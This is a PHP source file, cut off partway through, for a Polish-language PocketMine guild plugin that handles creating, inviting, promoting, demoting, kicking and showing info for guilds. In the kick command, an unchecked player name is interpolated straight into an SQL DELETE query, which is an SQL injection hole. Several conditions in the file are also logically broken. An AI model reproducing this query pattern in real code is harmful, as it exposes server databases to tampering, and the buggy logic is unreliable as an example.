<?php

namespace FactionsPro;

use pocketmine\command\CommandSender;
use pocketmine\command\Command;
use pocketmine\Player;
use pocketmine\utils\TextFormat;
use pocketmine\level\Position;
use pocketmine\item\Item;
use pocketmine\block\Block;
use pocketmine\math\Vector3;
use pocketmine\Server;
use pocketmine\entity\Effect;

class FactionCommands {
	
	public $plugin;
	
	public function __construct(FactionMain $pg) {
		$this->plugin = $pg;
	}
	
	public function onCommand(CommandSender $sender, Command $command, $label, array $args) {
		if($sender instanceof Player) {
			$player = $sender->getName();
			if(strtolower($command->getName('g'))) {
				if(empty($args)) {
					$sender->sendMessage($this->plugin->formatMessage("§7Wpisz §b/g pomoc!"));
					return true;
				}
				if(count($args == 2)) {
					
					/////////////////////////////// CREATE ///////////////////////////////
					
					if($args[0] == "create" || $args[0] == "zaloz") {
						if(!isset($args[1]) && !isset($args[2])) {
							$sender->sendMessage($this->plugin->formatMessage("§7Uzyj: §b/g zaloz §3<tag> §3<nazwa>"));
							return true;
						}
						if(strlen($args[2]) > 16){
						$sender->sendMessage($this->plugin->formatMessage("§cTa nazwa gidlii jest zbyt dluga maksymalna ilosc liter w nazwie to 16."));						
						return true;
						}
						if(isset($args[1]) && !isset($args[2])){
							$sender->sendMessage($this->plugin->formatMessage("§7Uzyj: §b/g zaloz§3 $args[1] §3<nazwa>"));
							return true;	
						}
						if(!isset($args[1]) && isset($args[2])){
							$sender->sendMessage($this->plugin->formatMessage("§7Uzyj: §b/g zaloz §3<tag>§3 $args[2]"));
							return true;
						}
						if(!(ctype_alnum($args[1]))) {
							$sender->sendMessage($this->plugin->formatMessage("§cMozesz jedynie uzyc liter oraz cyfr!"));
							return true;
						}
						if($this->plugin->isNameBanned($args[1])) {
							$sender->sendMessage($this->plugin->formatMessage("§cTa nazwa nie jest dozwolona."));
							return true;
						}
						if($this->plugin->factionExists(strtolower($args[1])) == true) {
							$sender->sendMessage($this->plugin->formatMessage("§cGildia o tej nazwie juz istnieje."));
							return true;
						}
						if(strlen($args[1]) > $this->plugin->prefs->get("MaxFactionTagLength")) {
							$sender->sendMessage($this->plugin->formatMessage("§cTen tag jest zbyt dlugi! Maksymalna ilosc liter w tagu to 4"));
							return true;
						}
						if(isset($args[1]) && isset($args[2])){
							if($sender->getInventory()->contains(Item::get(264, 0, 64)) or $sender->hasPermission("gildie.darmowe")){
							if($sender->getInventory()->contains(Item::get(265, 0, 64)) or $sender->hasPermission("gildie.darmowe")){
							if($sender->getInventory()->contains(Item::get(266, 0, 64)) or $sender->hasPermission("gildie.darmowe")){
							if($sender->getInventory()->contains(Item::get(388, 0, 64)) or $sender->hasPermission("gildie.darmowe")){
							if($sender->getInventory()->contains(Item::get(332, 0, 16)) or $sender->hasPermission("gildie.darmowe")){
							if($sender->getInventory()->contains(Item::get(322, 0, 16)) or $sender->hasPermission("gildie.darmowe")){
							if($sender->getInventory()->contains(Item::get(145, 0, 6)) or $sender->hasPermission("gildie.darmowe")){
						if($this->plugin->isInFaction($sender->getName())) {
							$sender->sendMessage($this->plugin->formatMessage("§cMusisz opuscic obecna gildie."));
							return true;                                              
						} else {
							$factionName = $args[1];                                                    

                                                        $x = floor($sender->getX());
                                                        $y = floor($sender->getY());
                                                        $z = floor($sender->getZ());
                                                        $level = $sender->getLevel(); 
														
                                                        foreach($this->plugin->prefs->get("BlackListWorlds") as $world) {
                                                            if(strtolower($sender->getLevel()->getName()) == $world) {
                                                                $sender->sendMessage($this->plugin->formatMessage("§cNie mozesz zalozyc w tym swiecie gildii!"));
                                                                return true;
                                                            }
                                                        }
                                                        
                                                        if($sender->getPosition()->distance($sender->getLevel()->getSafeSpawn()) < $this->plugin->prefs->get("RegionMinDistanceFromSpawn")) {
                                                            $sender->sendMessage($this->plugin->formatMessage("§cJestes zbyt blisko spawnu! Minimalna odleglosc to " . $this->plugin->prefs->get("RegionMinDistanceFromSpawn") . " kratek."));
                                                            return true;    
                                                        }
                                                        
                                                        $blockUnder = $level->getBlock(new Vector3($x, $y - 1, $z));
                                                        if($blockUnder->getId() == 7) {
                                                            $sender->sendMessage($this->plugin->formatMessage("§cJestes zbyt blisko skaly macierzystej!"));
                                                            return true; 
                                                        }
                                                        
                                                        if($sender->getY() > 50) {
                                                            $sender->sendMessage($this->plugin->formatMessage("§cJestes zbyt wysoko! Gildie mozesz zalozyc do Y: 50."));
                                                            return true;
                                                        }
                                                        
                                                        if(!$this->plugin->drawPlot($sender, $factionName, $x, $y, $z, $level, $this->plugin->prefs->get("PlotSize"))) {
                                                                return true;
                                                        }
														Server::getInstance()->broadcastMessage("§8"); 
														Server::getInstance()->broadcastMessage("§8§l*   §3§lONE§7§lHARD§7§l.§f§lPL   §8§l*"); 
														Server::getInstance()->broadcastMessage("§8"); 
                                                        Server::getInstance()->broadcastMessage("§8• §8» §7Gracz §3".$sender->getName()." §7zalozyl gildie!§r"); 
                                                        Server::getInstance()->broadcastMessage("§8• §8» §3Nazwa: §b".$args[2]." §8|§b§k:§8| §3Tag: §b".$factionName."§7!", true);   
														Server::getInstance()->broadcastMessage("§8"); 														
                                                                                                                
							$player = $player;                                                                   
							$rank = "Leader";
							$stmt = $this->plugin->db->prepare("INSERT OR REPLACE INTO master (player, faction, rank, chat, chat_type, chat_color) VALUES (:player, :faction, :rank, :chat, :chat_type, :chat_color);");
							$stmt->bindValue(":player", $player);
							$stmt->bindValue(":faction", $factionName);
							$stmt->bindValue(":rank", $rank);
                                                        $stmt->bindValue(":chat", 1);
                                                        $stmt->bindValue(":chat_type", "small");    
                                                        $stmt->bindValue(":chat_color", "&6");                                                                                                                
							$result = $stmt->execute();
							if($this->plugin->prefs->get("FactionNametags")) {
								
							}
														if(!$sender->hasPermission("gildie.darmowe")){
                                                        $sender->getInventory()->removeItem(Item::get(264, 0, 64));
                                                        $sender->getInventory()->removeItem(Item::get(265, 0, 64));
                                                        $sender->getInventory()->removeItem(Item::get(266, 0, 64));
                                                        $sender->getInventory()->removeItem(Item::get(388, 0, 64));                        
                                                        $sender->getInventory()->removeItem(Item::get(332, 0, 16)); 
														$sender->getInventory()->removeItem(Item::get(322, 0, 16));
														$sender->getInventory()->removeItem(Item::get(145, 0, 6));
														}
                                                        $stmt = $this->plugin->db->prepare("INSERT OR REPLACE INTO center (faction, lives, timeWarProtection, timeWarWait, x, y, z, world) VALUES (:faction, :lives, :timeWarProtection, :timeWarWait, :x, :y, :z, :world);");
                                                        $stmt->bindValue(":faction", $factionName);
                                                        $stmt->bindValue(":lives", $this->plugin->prefs->get("WarLives"));
                                                        $stmt->bindValue(":timeWarProtection", time());
                                                        $stmt->bindValue(":timeWarWait", 0);                                                        
                                                        $stmt->bindValue(":x", $x);
                                                        $stmt->bindValue(":y", $y + 1);
                                                        $stmt->bindValue(":z", $z);
                                                        $stmt->bindValue(":world", $sender->getLevel()->getName());
                                                        $result = $stmt->execute();                                                         
                                                        
                                                        $stmt = $this->plugin->db->prepare("INSERT OR REPLACE INTO top (faction, points, wins) VALUES (:faction, :points, :wins);");
                                                        $stmt->bindValue(":faction", $factionName);
                                                        $stmt->bindValue(":points", 1000);
                                                        $stmt->bindValue(":wins", 0);                                                        
                                                        $result = $stmt->execute();   
                                                        
                                                        $stmt = $this->plugin->db->prepare("INSERT OR REPLACE INTO expires (faction, time) VALUES (:faction, :time);");
                                                        $stmt->bindValue(":faction", $factionName);
                                                        $stmt->bindValue(":time", $this->plugin->prefs->get("Expires"));
                                                        $result = $stmt->execute();
                                                        
                                                        $stmt = $this->plugin->db->prepare("INSERT OR REPLACE INTO home (faction, x, y, z, world) VALUES (:faction, :x, :y, :z, :world);");
                                                        $stmt->bindValue(":faction", $factionName);
                                                        $stmt->bindValue(":x", $sender->getX());
                                                        $stmt->bindValue(":y", $sender->getY());
                                                        $stmt->bindValue(":z", $sender->getZ());
                                                        $stmt->bindValue(":world", $sender->getLevel()->getName());
                                                        $result = $stmt->execute();  
							$g = $this->plugin->getPlayerFaction($sender->getName());	
							$s = $this->plugin->prefs->get("PlotSize");
                            $this->plugin->pvp->set($g, "0");
							$this->plugin->zabicia->set($g, "0");
							$this->plugin->smierci->set($g, "0");
							$this->plugin->zabicia->save();
							$this->plugin->smierci->save();
							$this->plugin->pvp->save(); 
							$faction = $args[1];
							$player = $sender->getName();
							$motd = $args[2];
                            $this->plugin->setMOTD($faction, $player, $motd);
                                                        //serce
                             $createMaterial = explode(":", $this->plugin->prefs->get("CreateMaterial"));
                            $level->setBlock(new Vector3($x, $y - 1, $z), Block::get($createMaterial[0], $createMaterial[1]));       
                                                        //pusta przestrzen
							$sender->getLevel()->setBlock(new Vector3($sender->getFloorX(), $sender->getFloorY(), $sender->getFloorZ()), Block::get(0, 0));
							$sender->getLevel()->setBlock(new Vector3($sender->getFloorX(), $sender->getFloorY()+1, $sender->getFloorZ()), Block::get(0, 0));
							$sender->getLevel()->setBlock(new Vector3($sender->getFloorX(), $sender->getFloorY()+2, $sender->getFloorZ()), Block::get(0, 0));					                                                 
							return true;
						}
							}
														else{
							$sender->sendMessage($this->plugin->formatMessage("Aby zalozyc gildie potrzebujesz: §c64 §7diamenty, §c64§7 zlota, §c64 §7zelaza, §c64§7 emeraldow, §c16 §7perel, §c16 §7refili, §c6 §7kowadel!"));	
							}
							}
														else{
							$sender->sendMessage($this->plugin->formatMessage("Aby zalozyc gildie potrzebujesz: §c64 §7diamenty, §c64§7 zlota, §c64 §7zelaza, §c64§7 emeraldow, §c16 §7perel, §c16 §7refili, §c6 §7kowadel!"));			
							}
							}
														else{
							$sender->sendMessage($this->plugin->formatMessage("Aby zalozyc gildie potrzebujesz: §c64 §7diamenty, §c64§7 zlota, §c64 §7zelaza, §c64§7 emeraldow, §c16 §7perel, §c16 §7refili, §c6 §7kowadel!"));			
							}
							}
														else{
							$sender->sendMessage($this->plugin->formatMessage("Aby zalozyc gildie potrzebujesz: §c64 §7diamenty, §c64§7 zlota, §c64 §7zelaza, §c64§7 emeraldow, §c16 §7perel, §c16 §7refili, §c6 §7kowadel!"));		
							}
							}
														else{
							$sender->sendMessage($this->plugin->formatMessage("Aby zalozyc gildie potrzebujesz: §c64 §7diamenty, §c64§7 zlota, §c64 §7zelaza, §c64§7 emeraldow, §c16 §7perel, §c16 §7refili, §c6 §7kowadel!"));			
							}
							}
														else{
							$sender->sendMessage($this->plugin->formatMessage("Aby zalozyc gildie potrzebujesz: §c64 §7diamenty, §c64§7 zlota, §c64 §7zelaza, §c64§7 emeraldow, §c16 §7perel, §c16 §7refili, §c6 §7kowadel!"));		
							}
							}
							else{
							$sender->sendMessage($this->plugin->formatMessage("Aby zalozyc gildie potrzebujesz: §c64 §7diamenty, §c64§7 zlota, §c64 §7zelaza, §c64§7 emeraldow, §c16 §7perel, §c16 §7refili, §c6 §7kowadel!"));		
							}
						}
					}
					
					/////////////////////////////// INVITE ///////////////////////////////
					
					if($args[0] == "invite" || $args[0] == "zapros") {
						if(!isset($args[1])) {
							$sender->sendMessage($this->plugin->formatMessage("Uzyj: /g zapros <gracz>"));
							return true;
						}
						if(!$this->plugin->isInFaction($player)) {
							$sender->sendMessage($this->plugin->formatMessage("Musisz byc w gildii, aby uzyc tej opcji!"));
							return true;
						}
						if(!$this->plugin->isLeader($player) && !$this->plugin->hasPermission($player, "invite")) {
							$sender->sendMessage($this->plugin->formatMessage("Nie masz do tego uprawnien!"));
							return true;
						}
						if($this->plugin->isFactionFull(strtolower($this->plugin->getPlayerFaction($player)))) {
							$sender->sendMessage($this->plugin->formatMessage("Gildia jest pelna, nie ma miejsc na nowych czlonkow."));
							return true;
						}
						$invited = $this->plugin->getServer()->getPlayerExact($args[1]);
						if($this->plugin->isInFaction($invited) == true) {
							$sender->sendMessage($this->plugin->formatMessage("Gracz jest aktualnie w gildii."));
							return true;
						}
						if(!$invited instanceof Player) {
							$sender->sendMessage($this->plugin->formatMessage("Gracz nie jest online!"));
							return true;
						}
						$factionName = $this->plugin->getPlayerFaction($player);
						$invitedName = $invited->getName();
						$rank = "Member";
							
						$stmt = $this->plugin->db->prepare("INSERT OR REPLACE INTO confirm (player, faction, invitedby, timestamp) VALUES (:player, :faction, :invitedby, :timestamp);");
						$stmt->bindValue(":player", strtolower($invitedName));
						$stmt->bindValue(":faction", $factionName);
						$stmt->bindValue(":invitedby", $sender->getName());
						$stmt->bindValue(":timestamp", time());
						$result = $stmt->execute();

						$sender->sendMessage($this->plugin->formatMessage("Gracz $invitedName zostal zaproszony!", true));
						$invited->sendMessage($this->plugin->formatMessage("Zostales zaproszony do $factionName. Aby dolaczyc uzyj '/g dolacz' lub '/g odrzuc', aby odrzucic zaproszenie!", true));
					}
					
					/////////////////////////////// LEADER ///////////////////////////////
					
					if($args[0] == "leader" || $args[0] == "lider") {
						if(!isset($args[1])) {
							$sender->sendMessage($this->plugin->formatMessage("Uzyj: /g lider <gracz>"));
							return true;
						}
						if(!$this->plugin->isInFaction($sender->getName())) {
							$sender->sendMessage($this->plugin->formatMessage("Musisz byc w gildii, aby uzyc tej opcji!"));
							return true;
						}
						if(!$this->plugin->isLeader($player)) {
							$sender->sendMessage($this->plugin->formatMessage("Musisz byc liderem, aby uzyc tej opcji!"));
							return true;
						}
						if($this->plugin->getPlayerFaction($player) != $this->plugin->getPlayerFaction($args[1])) {
							$sender->sendMessage($this->plugin->formatMessage("Tego gracza nie ma w gildii!"));
							return true;
						}		
						if(!$this->plugin->getServer()->getPlayerExact($args[1]) instanceof Player) {
							$sender->sendMessage($this->plugin->formatMessage("Gracz nie jest online!"));
							return true;
						}
							$factionName = $this->plugin->getPlayerFaction($player);
	
							$stmt = $this->plugin->db->prepare("INSERT OR REPLACE INTO master (player, faction, rank, chat, chat_type, chat_color) VALUES (:player, :faction, :rank, :chat, :chat_type, :chat_color);");
							$stmt->bindValue(":player", $player);
							$stmt->bindValue(":faction", $factionName);
							$stmt->bindValue(":rank", "Member");
                                                        $stmt->bindValue(":chat", 1);
                                                        $stmt->bindValue(":chat_type", "small");
                                                        $stmt->bindValue(":chat_color", "&6");
							$result = $stmt->execute();
	
							$stmt = $this->plugin->db->prepare("INSERT OR REPLACE INTO master (player, faction, rank, chat, chat_type, chat_color) VALUES (:player, :faction, :rank, :chat, :chat_type, :chat_color);");
							$stmt->bindValue(":player", $args[1]);
							$stmt->bindValue(":faction", $factionName);
							$stmt->bindValue(":rank", "Leader");
                                                   	$stmt->bindValue(":chat", 1);
                                                        $stmt->bindValue(":chat_type", "small");
                                                        $stmt->bindValue(":chat_color", "&6");
							$result = $stmt->execute();
	
	
							$sender->sendMessage($this->plugin->formatMessage("Nie jestes juz liderem!", true));
							
							
							Server::getInstance()->broadcastMessage("§8"); 
							Server::getInstance()->broadcastMessage("§8§l*   §3§lONE§7§lHARD§7§l.§f§lPL   §8§l*"); 
							Server::getInstance()->broadcastMessage("§8"); 
        					Server::getInstance()->broadcastMessage("§8• §8» §7Gracz §3".$args[1]." §7został nowym liderem gildii!§r"); 
        					Server::getInstance()->broadcastMessage("§8• §8» §3Tag: §b" . $factionName . "§7!", true);   
							Server::getInstance()->broadcastMessage("§8"); 		
							if($this->plugin->prefs->get("FactionNametags")) {

								
							}
						}
					
					/////////////////////////////// PROMOTE ///////////////////////////////
					
					if($args[0] == "promote" || $args[0] == "oficer") {
						if(!isset($args[1])) {
							$sender->sendMessage($this->plugin->formatMessage("Uzyj: /g oficer <gracz>"));
							return true;
						}
						if(!$this->plugin->isInFaction($sender->getName())) {
							$sender->sendMessage($this->plugin->formatMessage("Musisz byc w gildii, aby uzyc tej opcji!"));
							return true;
						}
						if(!$this->plugin->isLeader($player) && !$this->plugin->hasPermission($player, "promote")) {
							$sender->sendMessage($this->plugin->formatMessage("Nie masz do tego uprawnien!"));
							return true;
						}
						if($this->plugin->getPlayerFaction($player) != $this->plugin->getPlayerFaction($args[1])) {
							$sender->sendMessage($this->plugin->formatMessage("Tego gracza nie ma w gildii!"));
							return true;
						}
						if($this->plugin->isOfficer($args[1])) {
							$sender->sendMessage($this->plugin->formatMessage("Ten gracz jest aktualnie oficerem."));
							return true;
						}
						$factionName = $this->plugin->getPlayerFaction($player);
						$stmt = $this->plugin->db->prepare("INSERT OR REPLACE INTO master (player, faction, rank, chat, chat_type, chat_color) VALUES (:player, :faction, :rank, :chat, :chat_type, :chat_color);");
						$stmt->bindValue(":player", strtolower($args[1]));
						$stmt->bindValue(":faction", $factionName);
						$stmt->bindValue(":rank", "Officer");
						$stmt->bindValue(":chat", 1);
						$stmt->bindValue(":chat_type", "small");
						$stmt->bindValue(":chat_color", "&6");

						$result = $stmt->execute();
						$player = $args[1];
						$sender->sendMessage($this->plugin->formatMessage("" . "Gracz " . $player . " zostal awansowany na oficera!", true));
						if($player = $this->plugin->getServer()->getPlayer($args[1])) {
							$player->sendMessage($this->plugin->formatMessage("Zostales awansowany na stopien oficera.", true));
						}
						if($this->plugin->prefs->get("FactionNametags")) {
								$this->plugin->updateTag($player->getName());
						}
					}
					
					/////////////////////////////// DEMOTE ///////////////////////////////
					
					if($args[0] == "demote" || $args[0] == "odbierz") {
						if(!isset($args[1])) {
							$sender->sendMessage($this->plugin->formatMessage("Uzyj: /g odbierz <gracz>"));
							return true;
						}
						if($this->plugin->isInFaction($sender->getName()) == false) {
							$sender->sendMessage($this->plugin->formatMessage("Musisz byc w gildii, aby uzyc tej opcji!"));
							return true;
						}
						if(!$this->plugin->isLeader($player) && !$this->plugin->hasPermission($player, "demote")) {
							$sender->sendMessage($this->plugin->formatMessage("Nie masz do tego uprawnien!"));
							return true;
						}
						if($this->plugin->getPlayerFaction($player) != $this->plugin->getPlayerFaction($args[1])) {
							$sender->sendMessage($this->plugin->formatMessage("Tego gracza nie ma w gildii!"));
							return true;
						}
						if(!$this->plugin->isOfficer($args[1])) {
							$sender->sendMessage($this->plugin->formatMessage("Ten gracz jest aktualnie czlonkiem."));
							return true;
						}
						$factionName = $this->plugin->getPlayerFaction($player);
						$stmt = $this->plugin->db->prepare("INSERT OR REPLACE INTO master (player, faction, rank) VALUES (:player, :faction, :rank);");
						$stmt->bindValue(":player", strtolower($args[1]));
						$stmt->bindValue(":faction", $factionName);
						$stmt->bindValue(":rank", "Member");
						$result = $stmt->execute();
						$player = $args[1];
						$sender->sendMessage($this->plugin->formatMessage("" . "Gracz " . $player . " zostal zniesiony na stopien czlonka!", true));
						
						if($player = $this->plugin->getServer()->getPlayer($args[1])) {
							$player->sendMessage($this->plugin->formatMessage("Zostales zniesiony na stopien czlonka.", true));
						}
						if($this->plugin->prefs->get("FactionNametags")) {
							$this->plugin->updateTag($player->getName());
						}
					}
					
					/////////////////////////////// KICK ///////////////////////////////
					
					if($args[0] == "kick" || $args[0] == "wyrzuc") {
						if(!isset($args[1])) {
							$sender->sendMessage($this->plugin->formatMessage("Uzyj: /g wyrzuc <gracz>"));
							return true;
						}
						if($this->plugin->isInFaction($sender->getName()) == false) {
							$sender->sendMessage($this->plugin->formatMessage("Musisz byc w gildii, aby uzyc tej opcji!"));
							return true;
						}
						if(!$this->plugin->isLeader($player) && !$this->plugin->hasPermission($player, "kick")) {
							$sender->sendMessage($this->plugin->formatMessage("Nie masz do tego uprawnien!"));
							return true;
						}
						if($this->plugin->getPlayerFaction($player) != $this->plugin->getPlayerFaction($args[1])) {
							$sender->sendMessage($this->plugin->formatMessage("Tego gracza nie ma w gildii!"));
							return true;
						}
                                                if($this->plugin->isLeader($args[1])) {
							$sender->sendMessage($this->plugin->formatMessage("Nie mozesz wyrzucic lidera gildii!"));
							return true;                                                    
                                                }
						$kicked = $this->plugin->getServer()->getPlayer($args[1]);
						$factionName = $this->plugin->getPlayerFaction($player);
					Server::getInstance()->broadcastMessage("§8"); 
					Server::getInstance()->broadcastMessage("§8§l*   §3§lONE§7§lHARD§7§l.§f§lPL   §8§l*"); 
					Server::getInstance()->broadcastMessage("§8"); 
        			Server::getInstance()->broadcastMessage("§8• §8» §7Gracz §3".$args[1]." §7został wyrzucony z gildii!§r"); 
        			Server::getInstance()->broadcastMessage("§8• §8» §3Tag: §b".$factionName."§7!", true);   
					Server::getInstance()->broadcastMessage("§8");			
						$this->plugin->db->query("DELETE FROM master WHERE player='$args[1]';");
						$players[] = $this->plugin->getServer()->getOnlinePlayers();
						if(in_array($args[1], $players) == true) {
							if($this->plugin->prefs->get("FactionNametags")) {
								$this->plugin->updateTag($args[1]);
							}
							return true;
						}
					}
					
					/////////////////////////////// INFO ///////////////////////////////
					
					if(strtolower($args[0] == "info" || $args[0] == "informacje")) {
						if(isset($args[1])) {
							if( !(ctype_alnum($args[1])) | !($this->plugin->factionExists(strtolower($args[1])))) {
								$sender->sendMessage($this->plugin->formatMessage("Ta gildia nie istnieje!"));
								return true;
							}
							$faction = strtolower($args[1]);
							$result = $this->plugin->db->query("SELECT * FROM motd WHERE LOWER(faction)='$faction';");
							$array = $result->fetchArray(SQLITE3_ASSOC);
							$message = $array["message"];
							$leader = $this->plugin->getLeader($faction);
							$numPlayers = $this->plugin->getNumberOfPlayers($faction);
							$gildies = $this->plugin->zabicia->get($args[1]);
							$gildies2 = $this->plugin->smierci->get($args[1]);
							$gildies3 = round($gildies / $gildies2, 2);
							$teren = $this->plugin->teren->get($args[1]);
							$pvpdata = $this->plugin->pvp->get($args[1]);
							$maxplayers = $this->plugin->prefs->get("MaxPlayersPerFaction");
							if($pvpdata >= 1){
							$sender->sendMessage(TextFormat::DARK_GRAY . "[" . TextFormat::GRAY . "----------" . TextFormat::DARK_GRAY . "[" . TextFormat::GREEN . "Gildie" . TextFormat::DARK_GRAY . "]" . TextFormat::GRAY . "----------" . TextFormat::DARK_GRAY . "]");
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Tag: " . TextFormat::GREEN . strtoupper($faction));
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Nazwa: " . TextFormat::GREEN . "$message");
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Lider: " . TextFormat::GREEN . "$leader");
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Czlonkow: " . TextFormat::GREEN . "" . $numPlayers . "§7/§a" . $maxplayers);
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Punkty: " . TextFormat::GREEN . $this->plugin->getFactionPoints($faction)); 
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Zycia: " . TextFormat::GREEN . $this->plugin->getFactionWarLives($faction));                                                          
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Zabojstwa: " . TextFormat::GREEN . $gildies);  
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Smierci: " . TextFormat::GREEN . $gildies2);
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "K/D: " . TextFormat::GREEN . $gildies3);    
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "PVP: " . TextFormat::GREEN . "ON");    							
                            $time = $this->plugin->db->query("SELECT * FROM expires WHERE LOWER(faction)='$faction';");
                            $array = $time->fetchArray(SQLITE3_ASSOC);
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Wygasa za: " . TextFormat::GREEN . floor($array["time"] / 1440) . TextFormat::GRAY . " dni, " . TextFormat::GREEN . floor((($array["time"] / 1440) * 24) % 24) . TextFormat::GRAY . " godzin i " . TextFormat::GREEN . floor(((($array["time"] / 1440) * 24) * 60) % 60) . TextFormat::GRAY . " minut");                                                          
							$sender->sendMessage(TextFormat::DARK_GRAY . "[" . TextFormat::GRAY . "----------" . TextFormat::DARK_GRAY . "[" . TextFormat::GREEN . "Gildie" . TextFormat::DARK_GRAY . "]" . TextFormat::GRAY . "----------" . TextFormat::DARK_GRAY . "]");
							}
						else{
							$sender->sendMessage(TextFormat::DARK_GRAY . "[" . TextFormat::GRAY . "----------" . TextFormat::DARK_GRAY . "[" . TextFormat::GREEN . "Gildie" . TextFormat::DARK_GRAY . "]" . TextFormat::GRAY . "----------" . TextFormat::DARK_GRAY . "]");
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Tag: " . TextFormat::GREEN . strtoupper($faction));
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Nazwa: " . TextFormat::GREEN . "$message");
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Lider: " . TextFormat::GREEN . "$leader");
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Czlonkow: " . TextFormat::GREEN . "" . $numPlayers . "§7/§a" . $maxplayers);
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Punkty: " . TextFormat::GREEN . $this->plugin->getFactionPoints($faction)); 
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Zycia: " . TextFormat::GREEN . $this->plugin->getFactionWarLives($faction));                                                          
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Zabojstwa: " . TextFormat::GREEN . $gildies);  
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Smierci: " . TextFormat::GREEN . $gildies2);
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "K/D: " . TextFormat::GREEN . $gildies3);    
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "PVP: " . TextFormat::GREEN . "OFF");   
							$time = $this->plugin->db->query("SELECT * FROM expires WHERE LOWER(faction)='$faction';");
                            $array = $time->fetchArray(SQLITE3_ASSOC);
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Wygasa za: " . TextFormat::GREEN . floor($array["time"] / 1440) . TextFormat::GRAY . " dni, " . TextFormat::GREEN . floor((($array["time"] / 1440) * 24) % 24) . TextFormat::GRAY . " godzin i " . TextFormat::GREEN . floor(((($array["time"] / 1440) * 24) * 60) % 60) . TextFormat::GRAY . " minut");                                                          
							$sender->sendMessage(TextFormat::DARK_GRAY . "[" . TextFormat::GRAY . "----------" . TextFormat::DARK_GRAY . "[" . TextFormat::GREEN . "Gildie" . TextFormat::DARK_GRAY . "]" . TextFormat::GRAY . "----------" . TextFormat::DARK_GRAY . "]");	
						}
						}
						else {
                           if($this->plugin->isInFaction($player)) {                                                    
                           $faction = $this->plugin->getPlayerFaction(strtolower($sender->getName()));
                           $faction = strtolower($faction);
						   $sfaction = $this->plugin->getPlayerFaction($sender->getName());
                           $result = $this->plugin->db->query("SELECT * FROM motd WHERE LOWER(faction)='$faction';");
                           $array = $result->fetchArray(SQLITE3_ASSOC);
                           $message = $array["message"];
                           $leader = $this->plugin->getLeader($faction);
                           $numPlayers = $this->plugin->getNumberOfPlayers($faction);
						   	$gildies = $this->plugin->zabicia->get($sfaction);
							$gildies2 = $this->plugin->smierci->get($sfaction);
							$gildies3 = round($gildies / $gildies2, 2);
							$teren = $this->plugin->teren->get($sfaction);
							$pvpdata = $this->plugin->pvp->get($sfaction);
							$maxplayers = $this->plugin->prefs->get("MaxPlayersPerFaction");
							if($pvpdata >= 1){
							$sender->sendMessage(TextFormat::DARK_GRAY . "[" . TextFormat::GRAY . "----------" . TextFormat::DARK_GRAY . "[" . TextFormat::GREEN . "Gildie" . TextFormat::DARK_GRAY . "]" . TextFormat::GRAY . "----------" . TextFormat::DARK_GRAY . "]");
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Tag: " . TextFormat::GREEN . strtoupper($faction));
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Nazwa: " . TextFormat::GREEN . "$message");
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Lider: " . TextFormat::GREEN . "$leader");
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Czlonkow: " . TextFormat::GREEN . "" . $numPlayers . "§7/§a" . $maxplayers);
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Punkty: " . TextFormat::GREEN . $this->plugin->getFactionPoints($faction)); 
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Zycia: " . TextFormat::GREEN . $this->plugin->getFactionWarLives($faction));                                                          
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Zabojstwa: " . TextFormat::GREEN . $gildies);  
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Smierci: " . TextFormat::GREEN . $gildies2);
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "K/D: " . TextFormat::GREEN . $gildies3);    
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "PVP: " . TextFormat::GREEN . "ON");    
							$time = $this->plugin->db->query("SELECT * FROM expires WHERE LOWER(faction)='$faction';");
                            $array = $time->fetchArray(SQLITE3_ASSOC);
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Wygasa za: " . TextFormat::GREEN . floor($array["time"] / 1440) . TextFormat::GRAY . " dni, " . TextFormat::GREEN . floor((($array["time"] / 1440) * 24) % 24) . TextFormat::GRAY . " godzin i " . TextFormat::GREEN . floor(((($array["time"] / 1440) * 24) * 60) % 60) . TextFormat::GRAY . " minut");                                                          
							$sender->sendMessage(TextFormat::DARK_GRAY . "[" . TextFormat::GRAY . "----------" . TextFormat::DARK_GRAY . "[" . TextFormat::GREEN . "Gildie" . TextFormat::DARK_GRAY . "]" . TextFormat::GRAY . "----------" . TextFormat::DARK_GRAY . "]");
							}
							else{
